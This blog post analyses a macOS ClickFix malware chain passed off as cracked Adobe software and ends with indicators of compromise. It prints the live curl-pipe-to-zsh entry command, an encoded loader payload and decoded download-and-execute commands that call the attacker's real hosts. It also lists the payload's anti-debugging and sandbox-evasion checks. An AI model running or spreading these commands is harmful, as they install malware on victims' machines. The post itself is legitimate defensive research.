---
title: "Analyzing HavenC2 Campaign"
date: 2026-08-09 12:00:00 +0200
description: "You thought you found a cracked version of the Adobe Creative Cloud suite and you end up with an infected device. Here is the analysis of a macOS malware infection chain."
tags: [macos, malware, forensics, reverse]
draft: false
---

# Introduction

This article follows a complete macOS infection chain, from a single line of shell pasted into a terminal all the way to the compiled payload waiting at the end of it. There are four stages, each with its own flavour of obfuscation, and I have tried to explain not only what each one does but why it was built that way. The last stage is where it gets genuinely interesting: an ad-hoc signed Mach-O that hides every string it uses, ships its own cryptographic stack, and ties its decryption key to the integrity of its own code.

> A note on the name: "HavenC2" is not an established family name, and no vendor calls it that. I made it up from the two domains involved, `haven-10.com` and `haven-vibe.com`, purely so the campaign has something to be called in this article. Please do not read it as an attribution or as a link to any previously documented family.

> A quick disclaimer: reverse engineering is not my specialty, and part of the work on the stage 3 binary was done with AI support. Everything that could be verified independently, such as the hashes, the self-hash comparison and the key derivation, was verified.

# Context

Fake installers are currently one of the preferred ways of distributing malware. You only have to look at the [*Claude Code*](https://code.claude.com/docs/en/quickstart) installation guide to see how easy it is to push malware from a domain that mimics a legitimate name. If you want to dig into that specific pattern, I recommend reading this [article](https://www.trendmicro.com/fr_fr/research/26/e/installfix-and-claude-code.html).

The example presented here is slightly different. Someone I know was looking for a cracked version of one of the tools in the Adobe Creative Cloud Suite (this is a bad idea, please don't do that). They told me the installation method was really simple: a single command to paste into the terminal. Luckily they never ran it, so I got a clean copy of the entry point. I decided to reverse the infection chain to show concretely what that one paste would have cost them.

This delivery pattern has a name: **ClickFix**. The site tells the visitor to copy a command and paste it into Terminal, usually framed as a fix, an activation step, or a captcha. The victim performs the execution themselves, which means no download prompt, no double-click warning, and no installer for the operating system to vet.

> Remember one thing: not everybody is a cybersecurity expert. In this kind of situation it is important not to condemn or make fun of the people who fall into these traps. Raise awareness by explaining the risks, and always do it with a positive approach.

# Summary

- [Stage 0 - Fake Installer Command Execution](#stage-0---fake-installer-command-execution)
- [Stage 1 - Obfuscated zsh loader](#stage-1---obfuscated-zsh-loader)
- [Stage 2 - Beacon and payload fetch](#stage-2---beacon-and-payload-fetch)
- [Stage 3 - The Mach-O payload](#stage-3---the-mach-o-payload)
- [Conclusion](#conclusion)
- [Indicators of Compromise](#indicators-of-compromise)

# Stage 0 - Fake Installer Command Execution

The entry point pasted into Terminal by the victim:

```bash
curl -s $(echo "aHR0cHM6Ly9oYXZlbi0xMC5jb20vY3VybC9mYWZiZTY4OTI0M2VmMmJjMjU2M2E5ZmFiNTBiMTUyMTJiMDc3YmFjYTI0MjdjMzI1MGI5YjQ5YzAzNGUwYWFk" | openssl base64 -d -A) | zsh
```

Once decoded, the blob is simply the address the script comes from:

```
https://haven-10.com/curl/fafbe689243ef2bc2563a9fab50b15212b077baca2427c3250b9b49c034e0aad
```

Three things in this one-liner are deliberate:

- **The URL is base64-wrapped.** This is aimed at the human, not at the security stack: the victim pastes a line where no domain is visible, so there is nothing to look suspicious and nothing to search for before hitting Enter. Any tooling that bothers to decode base64 still sees the URL, so this is obfuscation, not evasion.
- **`openssl base64 -d -A` rather than `base64 -d`.** The `-A` flag lets `openssl` swallow the whole blob on a single line, which `openssl` otherwise refuses. It also keeps the command away from the more commonly watched `base64 -d` pattern, though both are trivially detectable if you are looking for either.
- **`curl | zsh`.** The script is piped straight into the shell, so it never lands on disk and on-access antivirus has no file to scan. The `-s` flag suppresses the progress meter, so the terminal stays quiet and the victim sees nothing that looks like a download.

The `/curl/<64-hex>` path looks like a per-victim token rather than a static file name. I could not confirm that without a second sample, but the shape of it, plus the tracking headers we will see in stage 2, point that way.

---

# Stage 1 - Obfuscated zsh loader

The server returns a zsh script. Roughly 95% of it does nothing at all:

```bash
# dead code: result never used
w9sqdyo1pi29="$(sw_vers -productVersion 2>/dev/null)"
zzyr74=$(uname -s 2>/dev/null)

# entropy/timing padding, no side effect
pcoy=0
while [ $pcoy -lt 2 ]; do
  : "$((RANDOM % 256))"
  pcoy=$((pcoy+1))
done

# never called
check_integrity_w21() {
  local x944=0
  [ -d "$HOME" ] && x944=1
  return $x944
}

# decoy blob: never referenced by any line in the script
v6ldfsx0=$(cat <<'_EOF_'
eZaXej72XasO2204IR1Kw+sl4G7BBK+ACpSUGrfgO7zdkelIWRdgPk5kagnT
_EOF_
)
```

This padding is worth a second of attention, because it is what makes the script look busy to a reviewer skimming it. Nothing here has a side effect: the `sw_vers` and `uname` results are assigned and never read, the loop only burns two iterations of `$RANDOM`, and the function is never called.

The blob is the most convincing part, so it is worth actually decoding it. It gives 45 bytes with no magic bytes, no readable strings and no structure of any kind, and no line in the script ever references `v6ldfsx0`. It is there to make you waste your time.

The functional part is three lines: a gzip'd, base64'd blob decompressed into a variable and passed to `eval`.

```bash
zt070w=$(openssl base64 -d <<'PAYLOAD_END' | gunzip
H4sIAAAAAAAC/6xTXU/bShB996/Ym2vFRFe+mVl7dwlqkAptRaBVafkoVCuhEDuJiWPHsU3shPz3
andNCW0f+7CSZ+fMObMzx//+072Pku46n1pWmgalR4ezvO637L0oIG5J6GE3CB+7SRnHnZYVzItq
vJolQU8h8jofFTFxEzJd/T8P53m0DncLyNMTCUfTlECnZc1YTTErRn3h0Z71kE9XVPiT6bi/LwS1
rJgvFwXt23uLZZQUY+JIZCCR+81R354EQSUwoY/O+yiRc4k+k8i4BMZMzFCiT/U9MJX3JOoaZmp1
HWgcNPeaQ2vRpt4zmiqv7nijIUSDfdFVdSCY4dTcnuFSed93OlbK79ny1fM0PWvkFMTeaNCWuOP8
grg+cd1RmiThqHCLaB6mZUEYcd35sNIxQSDuDTn/fHFJ3BPilHm4PCBvJ4PqenGbngyhEiwUkBSn
UXJ1e/7l/bqXZ/vHD1/j62CVnXx0P32o786rASwcXX9URnEweKcpsuro+717mZwFd6fLFMLFUZ2U
V3B3NVxNzx6Oa1j5ePOtHgwc0rI3ZnfbFnnzsvodF9DDNpK2lY2qePhXNgwcJXD442ZBj1ONFiV6
KJFSicg0HsGXCF4zci5RoERULhGGg3oS9NbUN5eIvlqNRE9IBBWDwdPm+L5Eqg4zvYIw/Mp5jBp+
tWLVBxfmjR6VwE3f5o2ecdtPpz27yG/erl3kdKzp4zrLJrvzM3jfuFfP43lmzPTNm29OnY615HFv
/Gr8Al4kjPGdjjWLonLym1EVq1LR/85rs6bE3pjetsTemC1vSbtN7I2W3BJ3tAPRCS2yJf9Vvyaa
wLIOiL2JaG8+y4IaDvqw1TcFTehjtdLxjwAAAP//U/+dAboEAAA=
PAYLOAD_END
)
eval "${zt070w}"
```

The `H4sI` prefix is how the gzip magic `1f 8b 08` looks once base64-encoded, which is a quick way to spot a compressed payload in a script without decoding anything. Pulling that blob out and reversing the two layers gives stage 2.

---

# Stage 2 - Beacon and payload fetch

The decompressed script uses a different obfuscation approach. Every string, including command names, is built at runtime from octal `printf` escapes, so grepping the file for a URL, a domain, or even `curl` returns nothing:

```bash
oodu32aksy="$(id -u 2>/dev/null)"
dmtxfwknd9="$(sysctl -n hw.memsize 2>/dev/null || echo 0)"

l6rpt2=$(printf '\150\164\164\160\163\072\057\057\150\141\166\145\156...')
o6b5r=$(printf '\143\165\162\154')
${o6b5r} -fsS -4 --connect-timeout 5 --max-time 10 -X POST \
  -H 'user: AgIxVpYoHa0x75e70ntJinUYPQEz9sq8CjRlVdwqHL-MFy_PxI0p' \
  -H 'BuildID: AgIqxBZb-TnKd_Jro0epBynuU0_UawhKjCy0w41XWyII' \
  "${l6rpt2}" </dev/null >/dev/null 2>&1 &

qcxla2=$(printf '\150\164\164\160\163\072\057\057\150\141\166\145\156\055\061\060...')
hvzqqg=$(printf '\057\164\155\160\057\150\145\154\160\145\162')
r6l9f=$(printf '\170\141\164\164\162')
kiiug=$(printf '\143\150\155\157\144')
${o6b5r} -o ${hvzqqg} ${qcxla2} && ${r6l9f} -c ${hvzqqg} && ${kiiug} +x ${hvzqqg} && ${hvzqqg}
```

The encoding is uniform, so every escaped string in the file resolves in one pass:

```
https://haven-vibe.com/api/metrics/run?event=pasted
curl
https://haven-10.com/2kqYRM0DCrnyJgoS4gVLl_FHJRRdTUhGCbjyuYwpZ6c/kis/update
/tmp/helper
xattr
chmod
```

Substituting them back gives the readable version of stage 2:

```bash
id -u                      # assigned to a variable, never used afterwards
sysctl -n hw.memsize       # same

# 1. Beacon
curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST \
  -H 'user: AgIxVpYoHa0x75e70ntJinUYPQEz9sq8CjRlVdwqHL-MFy_PxI0p' \
  -H 'BuildID: AgIqxBZb-TnKd_Jro0epBynuU0_UawhKjCy0w41XWyII' \
  "https://haven-vibe.com/api/metrics/run?event=pasted" &

# 2. Stage 3 download and execute
curl -o /tmp/helper "https://haven-10.com/2kqYRM0DCrnyJgoS4gVLl_FHJRRdTUhGCbjyuYwpZ6c/kis/update" \
  && xattr -c /tmp/helper \
  && chmod +x /tmp/helper \
  && /tmp/helper
```

What it actually does, in order:

1. **Two host values are collected, then ignored.** `id -u` gives the current UID and `sysctl -n hw.memsize` gives the amount of RAM. Those are the two classic building blocks of a privilege check and a VM/sandbox check, so it is tempting to label this section "recon". But in this sample the results are stored in `oodu32aksy` and `dmtxfwknd9` and never read again: nothing branches on them and neither value is sent to the server. Functionally they belong with the dead code from stage 1, and the fact that the same padding idiom shows up in both stages suggests a shared generator. Two readings are possible: either the operator kept the recon calls but dropped the logic that used them, or they are pure decoys meant to make an analyst chase a fingerprinting routine that does not exist.
2. **Beacon.** A POST to `haven-vibe.com` with no body, backgrounded with `&` and fully silenced (`</dev/null >/dev/null 2>&1`). The `event=pasted` parameter is operator telemetry confirming that the ClickFix paste actually happened, while the `user` and `BuildID` headers look like per-victim and per-campaign/affiliate tracking tokens. `-fsS` keeps it quiet but still fails cleanly on an HTTP error, `-4` forces IPv4 to avoid a slow dual-stack resolution, and the tight `--connect-timeout 5 --max-time 10` guarantees that an unreachable telemetry host cannot stall the infection. Worth noting: the beacon domain is not the payload domain, so telemetry and delivery sit on separate infrastructure and can be taken down independently.
3. **Download.** Stage 3 is written to `/tmp/helper`.
4. **`xattr -c` on the dropped file.** This is usually described as a Gatekeeper bypass, and that is the intent, but the detail matters here: `curl` does not set `com.apple.quarantine`. That attribute is applied by applications that opt into it through `LSFileQuarantineEnabled`, which means browsers and mail clients, not command-line downloaders. So this call is almost certainly clearing an attribute that was never set. It is defensive boilerplate, reused from a chain where the file did arrive through a quarantining application. Also note that `-c` strips *all* extended attributes, not just the quarantine one.
5. **Execute.** Every step is chained with `&&`, so the binary only runs if the download, the `xattr` call, and the `chmod` all succeeded.

Since `xattr -c` is a no-op here, it does not tell us anything about what stage 3 actually is. `chmod +x` followed by direct execution is consistent with a compiled executable, but a script with a shebang would be launched in exactly the same way. The only way to settle it was to fetch the file, which is the subject of the next section.

---

# Stage 3 - The Mach-O payload

I retrieved the file from the distribution host and analysed it without ever executing it. Everything below comes from the Mach-O headers, from the disassembly, and from replaying the binary's own arithmetic inside a CPU emulator, which is enough to reconstruct the strings it hides without letting a single instruction run on a real macOS process.

I have since submitted the sample to VirusTotal, so if you want to pull it yourself, check the current detection rate, or pivot on it, it is available [here](https://www.virustotal.com/gui/file/2546ca39aaf50e6f1e86072ac132928a315b5c3b4f0faffe21d8c93456aeef4e).

Identity card:

| Property             | Value                                                                       |
| -------------------- | --------------------------------------------------------------------------- |
| Type                 | Mach-O universal binary, two slices (x86_64 and arm64)                      |
| Signature            | Ad-hoc signed (`CS_ADHOC`), no Team ID, no entitlements, **not notarized**  |
| Signing identifier   | `setup-2345e5dcbb6d6682548b8830d6c9194095c6b87b`                            |
| Linked libraries     | `libSystem.B.dylib`, `libc++.1.dylib`                                       |
| Built with           | SDK 26.2.0, minimum macOS 11.0 (arm64) and 10.15 (x86_64)                   |
| Symbols              | Stripped                                                                     |

Two things stand out immediately. The signing identifier starts with `setup-`, which fits the fake installer story nicely, and the file is only ad-hoc signed. That means no Apple Developer certificate was ever involved, so on a normally quarantined download Gatekeeper would refuse to run it outright. It works here only because the file arrives through `curl`, which never applies the quarantine attribute in the first place. The `xattr -c` from stage 2 protects a scenario the operator no longer needs.

## A binary that contains almost no strings

The import table has thirteen entries once you discount `dyld_stub_binder`, which the linker adds to every binary. That is remarkably few for a functional payload:

```
__chkstk_darwin   __stack_chk_fail   __stack_chk_guard   _dyld_get_image_header
bzero             dlsym              free                getenv
getsectiondata    malloc             memcpy              pthread_main_np
strstr
```

There is no networking, no file API, no process API. Everything the payload really needs is resolved at runtime through `dlsym`, so nothing incriminating appears in the import table for a static scanner to flag.

The string situation is even more extreme. The whole `__TEXT.__cstring` section is **14 bytes long**, and it holds exactly two strings: `__TEXT` and `__text`. That is the entire literal content of the binary. Every other string, including every single API name passed to `dlsym`, is assembled on the stack byte by byte through chains of multiply, add and xor operations, then wiped with a zero loop as soon as the call returns. A memory dump taken a few instructions later would find nothing.

The rest of the data lives in `__DATA_CONST.__const`, which is 79,304 bytes at an entropy of 7.998 out of 8. The first 208 bytes hold key material, stored in the clear but indistinguishable from noise because hashes and salts look like noise. Everything after that is ciphertext, uniformly, to the last byte.

## The SHA-256 constants, split in half

The binary has two `__mod_init_func` entries, so two functions run before `main` is even reached. Both do the same thing: they walk a fixed number of bytes and rebuild a table in `__bss` by adding two separate source tables together, 32 bits at a time.

Rebuilding both by hand gives the answer. One produces 32 bytes that are the **SHA-256 initialisation vector** (`6a09e667`, `bb67ae85`, and so on), the other produces 256 bytes that are the **SHA-256 round constants**, rotated left by 44 positions.

This is a small detail but a smart one. Plenty of YARA rules and crypto identification plugins look for `0x6a09e667` or `0x428a2f98` sitting in a data section. Here neither value exists anywhere in the file. They only come into being in memory, after the loader has already handed control to the constructors, and even then the round constants are rotated so the table does not start where a signature would expect it to.

## The crypto stack, built by hand

Those constants feed a complete cryptographic stack that the author wrote from scratch rather than calling CommonCrypto, which would have shown up in the import table. Five routines do all of it:

| Address        | Role                 | How it identifies itself                                                    |
| -------------- | -------------------- | --------------------------------------------------------------------------- |
| `0x100006914`  | SHA-256 compression  | consumes the two tables rebuilt by the constructors                          |
| `0x10000676c`  | SHA-256              | the function called with the `__text` section                                |
| `0x1000063ac`  | HMAC-SHA256          | `movi v0.16b, 0x36` and `movi v1.16b, 0x5c`, the ipad and opad constants     |
| `0x100006c7c`  | Keystream generator  | takes a block index and writes that many bytes of keystream                  |
| `0x1000044e0`  | Tag verification     | encrypt-then-MAC, returns 1 when the tag matches                             |

The HMAC function is called 3,116 times in a single run. Four of those calls are key derivation, and one of them uses an all zero key, which is the HKDF-Extract convention. The other **3,112 are chained**: the first hashes the salt followed by a big endian counter of 1, and every call after that hashes the output of the previous one. That is the PBKDF2-HMAC-SHA256 inner loop, with an iteration count of 3,112.

Put together, the payload carries its own AEAD: PBKDF2 to stretch the key, an HMAC-based counter mode keystream for confidentiality, and an HMAC tag for integrity. No AES, no ChaCha, nothing borrowed from the system. It is all built on the SHA-256 core whose constants they took the trouble to hide.

## The anti-analysis suite

Recovering the stack strings gives the full list of what the payload checks before doing anything. It is long, and it is clearly maintained by someone who follows the tooling.

Environment variables, read through `getenv`:

```
DYLD_INSERT_LIBRARIES    DYLD_FORCE_FLAT_NAMESPACE   DYLD_PRINT_LIBRARIES
DYLD_PRINT_INITIALIZERS  DYLD_PRINT_BINDINGS         DYLD_IMAGE_SUFFIX
MallocStackLogging       MallocStackLoggingNoCompact NSZombieEnabled
```

Parent process name, obtained with `getppid` then `proc_pidpath`, and matched against:

```
lldb          debugserver   lldb-rpc-server   frida-server   frida-trace
hopper        radare2       /r2               cutter         ghidra
x64dbg        binaryninja   gdb               class-dump     mitmproxy
Charles       Proxyman      objection         jtool2         dtrace
fs_usage
```

Every library loaded in the process, enumerated with `_dyld_image_count` and `_dyld_get_image_name`, matched against:

```
frida     Frida       FridaGadget   substrate   Substrate   MobileSubstrate
SBInjector  libcycript  libReveal   RevealServer  Dobby     fishhook
Cycript   SSLKillSwitch
```

A debugger check that does not use the obvious API. Instead of calling `ptrace` or `sysctl` by name, it goes through the raw `syscall` interface with call number 202, asks the kernel for its own `kinfo_proc` structure, and tests the `P_TRACED` bit in `p_flag`.

A timing check built on `mach_absolute_time`, normalised through `mach_timebase_info` so it behaves the same on Intel and Apple Silicon.

And finally a virtualisation check that queries `hw.model`, `machdep.cpu.brand_string`, `kern.hostuuid` and `kern.hv_vmm_present`, then also walks the IOKit registry, builds a lowercase profile string out of the results, and searches it for:

```
qemu      vmware      kvm         virtual machine      virtualmac
(virtual) chip: unknown           processor name: unknown
intel core 2
```

That last block holds the most immediately useful find for defenders. Alongside the generic virtualisation keywords, the list contains four specific machine serial numbers and one specific hardware UUID:

```
zf4dtjrdmf     z31fhxyq0j     c07t508tg1j2     c02tm2zbhx87
16419285-2711-56f7-a9ed-f41e752e1009
```

Those are not generic patterns, they are individual machines. Someone submitted this malware family to a sandbox or an analysis service, the operator noticed, collected the hardware identifiers of the machines that did it, and hardcoded them into the build so those specific hosts never see the payload again. If you run a sandbox and one of those values matches yours, you have been burned and it is worth rotating them.

## Detection does not stop the malware, it breaks the key

This is the part I found genuinely clever, and it is the reason patching the checks out does not work.

In most malware, an anti-analysis check ends in a branch: if a debugger is found, exit. You can defeat that by flipping the jump. Here, nothing of the sort happens. Every check that trips instead does an exclusive or of a distinct constant into a single flags word held on the stack. Execution continues normally either way, and there is no visible difference in control flow.

That flags word is then folded into the decryption key at the very end. The key is 36 bytes and is built in two halves:

```
key = [ 4 bytes derived from the detection flags ]
    + [ SHA-256( own __TEXT.__text section )  XOR  embedded_constant ]   (32 bytes)
```

Two consequences follow from that construction.

First, the binary hashes its own executable code and uses the digest as key material. Change a single byte of the code section, whether by patching an anti-debug check or by letting a debugger write a software breakpoint into a saved copy, and the key changes with it. The payload then decrypts to garbage.

Second, if any environment check trips, the flags word is no longer zero and the key is wrong again. There is no error message, no early exit, nothing to breakpoint on. The malware simply produces noise and does nothing, and an analyst is left staring at a program that appears to work but never reveals anything. Getting the real plaintext requires an environment that is genuinely clean rather than one that has been made to look clean.

That `embedded_constant` is worth a closer look, because it is not arbitrary. Hashing the code section myself and comparing it against the 32 bytes stored at `0x10000c070` gives an exact match:

```
sha256(__TEXT.__text)   = ccf64bd8006497c59ed49c7da3a581d1d7a8ad880d684dcdd59b5944e33be031
constant stored at file = ccf64bd8006497c59ed49c7da3a581d1d7a8ad880d684dcdd59b5944e33be031
```

The binary ships its own expected code hash. The exclusive or of the computed hash against the stored one therefore yields 32 zero bytes on an untouched sample, and something unpredictable on a patched one. It is a very clean way to build integrity checking into the key instead of into a comparison you could jump over, and it is nice to be able to prove the design rather than infer it from the disassembly.

There is a side effect the author may not have wanted. Since the self-hash contributes nothing at all when it passes, and since no host-specific value ever enters the derivation, the key is identical on every clean machine. It is not per victim, unlike the tokens in the earlier stages.

## What it does on a clean machine

When every check passes, the sequence is short and very deliberate:

1. It allocates a buffer with `mmap`, then calls **`mlock`** on it. That pins the pages in physical memory so the decrypted payload can never be written to swap, which means it cannot be recovered later from the swap file. It is anti-forensics applied to the disk it never touches.
2. It decrypts the payload into that locked buffer.
3. It calls `dlopen` on `/System/Library/Frameworks/Carbon.framework/Carbon`.
4. It calls `TransformProcessType` with `kProcessTransformToUIElementApplication`, which removes the process from the Dock and from the application switcher.
5. It resolves `OpenDefaultComponent`, `AECreateDesc`, `OSALoad`, `OSAExecute`, `OSADispose` and `CloseComponent`, opens the default `'osa '` / `'scpt'` component, and runs a compiled AppleScript **inside its own process**.
6. It zeroes the buffer, unlocks it and unmaps it.

Point 5 is the one worth stopping on. Running AppleScript from malware is normally done by spawning `osascript`, which is loud: it creates a child process with a well known name, and every EDR on the market watches for it. Going through the OSA component API directly means the script executes inside the already running binary. There is no child process, no `osascript` in the process tree, and no command line to log. From the outside, all you see is one unsigned process from `/tmp` that opened Carbon.

## The AppleScript itself

The decrypted script is 194 bytes and decodes cleanly. It carries a valid `FasdUAS 1.101.10` header at the start and the `FADEDEAD` end marker at the end, which is how I know the decryption was correct all the way through rather than just at the beginning.

Its content, on the other hand, is underwhelming:

```
FasdUAS 1.101.10 ... .aevtoappnull ... .aevtoappnull ... ascr ... FADEDEAD
```

There is not a single string literal in it. No `do shell script`, no URL, no file path, no `tell application`. Structurally it is one empty `on run` handler, which means that as written it does nothing at all.

I can see two honest readings. Either this is a capability probe, where the loader verifies that in-process AppleScript execution works and that the process has the permissions it needs before committing to anything noisy, or the sample I retrieved is a staged build where the real script is delivered separately. What comes out of the encrypted section below tips the balance slightly towards the second, but not far enough for me to call it.

## Recovering the key, and what it opens

Once the cryptographic stack is understood, the key itself can be lifted straight out of the derivation rather than guessed. The values are short:

```
key   = c556988b followed by 32 zero bytes      (36 bytes total)
salt  = a967a8dc507282aaa53e8498c3b6606cb4308ff0efdb74cd7e1a42f99cb4e539
```

The 32 trailing zero bytes are the self-hash check passing, exactly as described above. All of the remaining entropy sits in those first four bytes.

With the key and the salt, the whole construction can be reimplemented independently and it reproduces the malware's keystream byte for byte. That is worth stating plainly, because it means the AppleScript can be decrypted offline, from the file alone, with no emulation and nothing running. The `FasdUAS` header comes out intact.

The layout of the section turns out to be simple. Offsets below are file offsets in the arm64 slice; add `0x100000000` to get the virtual address that appears in the disassembly.

| Offset          | Contents                                                        |
| --------------- | ---------------------------------------------------------------- |
| `0xc040`        | 8 byte seed, the first input to the derivation                   |
| `0xc070`        | 32 byte expected `SHA-256(__TEXT.__text)`                        |
| `0xc090`        | 32 byte root key                                                 |
| `0xc0b0`        | 32 byte PBKDF2 salt                                              |
| `0xc0d0`        | 64 bytes, purpose not identified                                 |
| `0xc110`        | The AppleScript, 194 bytes of ciphertext                         |
| `0xc1d2`        | Authentication tag for it                                        |
| `0xc1f2` onward | Roughly 79 KB, high entropy, nothing recoverable                 |

## What I could not get

I want to be explicit about where this analysis stops, because the interesting part is also the part I could not finish.

I generated half a megabyte of keystream, which covers 16,384 block indices, and swept the entire 79,304 byte section against every one of them looking for structure: Mach-O and fat magics, gzip, `bplist00`, plist and XML headers, shebangs, URLs, common macOS paths, keychain and cookie filenames. Across that whole search space there was exactly **one** genuine hit, and it was the AppleScript I already had. A Mach-O magic did match further in, but the bytes after it are noise, and a single spurious match is about what you would expect from a four byte pattern over a search that size.

So the conclusion is stronger than "the rest is gated behind runtime conditions". Every other blob is **independently keyed**, and those keys are not in the file. The binary as shipped cannot decrypt its own remaining data.

That reframes what this sample is. Its entire process lifetime is: run the checks, decrypt one 194 byte blob, execute an empty AppleScript inside its own process, return from `main`, exit. Nothing else happens.

Two readings again, and this time I lean towards the first. Either the remaining key material arrives from the C2, which would mean a captured binary is deliberately worthless on its own and the operator can revoke every sample simply by taking the server down, or the 79 KB is decoy weight carried to make the payload look substantial. Given the care spent on everything else in this binary, deliberate design seems far more likely than 79 KB of padding.

Either way, the practical takeaway for anyone else looking at this family is that the file alone will not give up its payload, no matter how clean your analysis environment is. You would need to capture the key exchange, which means catching the sample live on a machine that passes every check, with full network capture running.

## What the scanners make of it

VirusTotal splits the universal binary into its two slices and scans each: **2 out of 62** for the arm64 one, **1 out of 62** for the x86_64 one. Effectively undetected, which is the whole point of everything above. A scanner needs something to match on, and this binary has removed every candidate.

The automated sandbox run is more instructive still. Verdict: **1 out of 100, non malicious**. Everything it flagged with any weight is a static property of the file, the ad-hoc signature, the fat binary, the high entropy section, all of which came out of the headers earlier without running anything. It reported no observed behaviour, because there was none.

That is the design working. The guest was a virtual machine, the sample checks `kern.hv_vmm_present`, `hw.model` and the IOKit registry against a list holding `vmware`, `qemu` and `kvm`, and tripping a check does not stop it, it corrupts the key. So it ran, decrypted noise, did nothing with it, and returned from `main`. **A clean sandbox verdict on a sample built this way is not evidence that the file is harmless, it is evidence that the sandbox was recognised.**

Two things in the report confirm findings from the static analysis. There is no `osascript` anywhere in the process tree, exactly as the OSA component route predicts, since the script runs in-process and never becomes a child. And the sample does not appear in the process list at all, which fits something that lives for a few hundred milliseconds.

Both reports also list contacted IP addresses. I am not publishing them as indicators. Most are Apple and Amazon infrastructure or the guest's DNS resolver, none is flagged by any engine, and this binary has no socket API in its imports and resolves nothing network related through `dlsym`. It is guest background traffic. The one exception I would keep an eye on is `185.196.12.16`, in Romania, which is the only address that appears in both reports and belongs to neither Apple nor Amazon. That is still not evidence, since both reports may come from the same detonation.

---

# Conclusion

Four stages, and each one hides in a different way: a base64 wrapped URL to get past the human, a decoy heavy shell script to waste the reviewer's time, octal escapes to defeat a grep, and finally a Mach-O that strips out every string, builds its own crypto and ties the decryption key to the integrity of its own code. None of these tricks is exotic on its own. Put together, they are enough to walk out of a sandbox with a clean verdict.

The honest summary is that the chain is mapped all the way to the last door, and that door is still shut. I know how the payload protects itself, how its key is built, and why the remaining data will not come out of the file alone. What it actually does once it lands on a real machine, I still do not know.

So if you work on macOS malware and any of this looks familiar, if you have a sample from the same family or a related build, or if you simply spot something I got wrong, I would genuinely like to hear from you. Corrections are as welcome as new material. Reverse engineering is not my field, and this write up will only get better for being picked apart.

---

# Indicators of Compromise

## Domains

Both domains are not reported as malicious on public CTI databases.

| Value            | Description                       |
| ---------------- | --------------------------------- |
| `haven-10.com`   | Payload distribution host         |
| `haven-vibe.com` | Telemetry / victim-tracking C2    |

## URLs

| Value                                                                                        | Description                                                              |
| -------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| `https://haven-10.com/curl/fafbe689243ef2bc2563a9fab50b15212b077baca2427c3250b9b49c034e0aad` | Stage 0 entry point; serves stage 1. Per-victim token, likely single-use |
| `https://haven-10.com/2kqYRM0DCrnyJgoS4gVLl_FHJRRdTUhGCbjyuYwpZ6c/kis/update`                | Stage 3 Mach-O payload                                                   |
| `https://haven-vibe.com/api/metrics/run?event=pasted`                                        | Infection beacon; fires before the payload fetch                        |

## Hashes

| Algorithm | Value                                                              | Description                                  |
| --------- | ------------------------------------------------------------------ | -------------------------------------------- |
| SHA-256   | `b58aca0fc7ac1c12dc5eb4c81d2d2439bb0d147df9899efc60fe9c4138ae15f4` | Stage 1 obfuscated zsh loader                |
| SHA-256   | `281870414e00e8abefafaca2bb3be289e28e4943d10329892fbe55c90f935cb5` | Stage 2 deobfuscated zsh script              |
| SHA-256   | `2546ca39aaf50e6f1e86072ac132928a315b5c3b4f0faffe21d8c93456aeef4e` | Stage 3 Mach-O universal binary              |
| SHA-1     | `0fa4ccf680210672ce370d82af503a74d68097ef`                         | Stage 3 Mach-O universal binary              |
| MD5       | `dde816624bd9b3da4d4cc0d7974e03af`                                 | Stage 3 Mach-O universal binary              |
| SSDEEP    | `3072:CUBIgpuIIP2nAiVwhzOq9exGDuFbSauEXw2nCiV4hzOqtexODuFb:/agYZPuAQwhzOq9ENQuCQ4hzOqtU` | Stage 3 fuzzy hash, useful for finding rebuilt variants |
| SHA-256   | `dc62ca701401c295833215828c557dae15e7d2610a3ee4c107aaeaa97e57d71e` | Stage 3, arm64 slice only                    |
| SHA-256   | `d9deda9e16f1f0e78819da6c8e840fa057de884d6e6314da6a334132673e2794` | Stage 3, x86_64 slice only                   |

The stage 3 binary is [available on VirusTotal](https://www.virustotal.com/gui/file/2546ca39aaf50e6f1e86072ac132928a315b5c3b4f0faffe21d8c93456aeef4e).

## Other artifacts

| Type               | Value                                                        | Description                                                    |
| ------------------ | ------------------------------------------------------------ | -------------------------------------------------------------- |
| HTTP header        | `user: AgIxVpYoHa0x75e70ntJinUYPQEz9sq8CjRlVdwqHL-MFy_PxI0p` | Per-victim identifier                                          |
| HTTP header        | `BuildID: AgIqxBZb-TnKd_Jro0epBynuU0_UawhKjCy0w41XWyII`      | Campaign / affiliate build identifier                           |
| File path          | `/tmp/helper`                                                | Stage 3 drop location, `chmod +x`, extended attributes cleared |
| URI pattern        | `/curl/<64-hex>`, `/kis/update`                              | Path-prefix branching on the distribution host                 |
| Signing identifier | `setup-2345e5dcbb6d6682548b8830d6c9194095c6b87b`             | Ad-hoc code signature identity of stage 3                      |
| Mach-O UUID        | `f767520a-ae70-3058-a02b-81087307c896`                       | Stage 3, arm64 slice                                           |
| Mach-O UUID        | `e014fdb5-0db3-3052-8f68-2f6a1eb632bf`                       | Stage 3, x86_64 slice                                          |
| Embedded constant  | `ccf64bd8006497c59ed49c7da3a581d1d7a8ad880d684dcdd59b5944e33be031` | Expected `SHA-256(__TEXT.__text)` stored at `0x10000c070`, arm64 slice. Pins this exact build, since any recompilation changes it |
| Crypto salt        | `a967a8dc507282aaa53e8498c3b6606cb4308ff0efdb74cd7e1a42f99cb4e539` | PBKDF2 salt, stored at `0x10000c0b0`, arm64 slice              |

## Analysis machines blacklisted by the sample

These are not indicators of compromise. They are the hardware identifiers stage 3 refuses to run on, hardcoded by the operator after those machines were used to analyse an earlier build. If one of them is yours, treat it as burned.

| Type            | Value                                  |
| --------------- | -------------------------------------- |
| Machine serial  | `zf4dtjrdmf`                           |
| Machine serial  | `z31fhxyq0j`                           |
| Machine serial  | `c07t508tg1j2`                         |
| Machine serial  | `c02tm2zbhx87`                         |
| Hardware UUID   | `16419285-2711-56f7-a9ed-f41e752e1009` |
